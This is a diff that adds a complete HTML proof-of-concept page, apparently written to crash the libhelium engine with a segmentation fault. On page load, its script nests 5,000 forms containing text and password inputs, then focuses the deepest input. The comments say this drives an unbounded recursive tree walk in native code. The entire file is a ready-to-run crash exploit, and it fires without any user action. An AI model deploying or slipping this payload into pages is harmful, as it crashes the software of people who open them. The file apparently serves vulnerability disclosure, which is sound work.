@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>libhelium Native SIGSEGV PoC</title>
+</head>
+    <body>
+    <div id="root"></div>
+    <script>
+    function triggerMemoryCorruption() {
+        let current = document.getElementById('root');
+        
+        // Generate deep tree to force unbounded native C++ allocation
+        for (let i = 0; i < 5000; i++) {
+            let f = document.createElement('form');
+            let input1 = document.createElement('input');
+            input1.type = "text";
+            let input2 = document.createElement('input');
+            input2.type = "password";
+            f.appendChild(input1);
+            f.appendChild(input2);
+            current.appendChild(f);
+            current = f;
+        }
+        
+        // Trigger unbounded recursive tree walk in native layout engine
+        let deepInput = current.querySelector('input');
+        if(deepInput) deepInput.focus();
+    }
+    setTimeout(triggerMemoryCorruption, 500);
+    </script>
+    </body>
+</html>
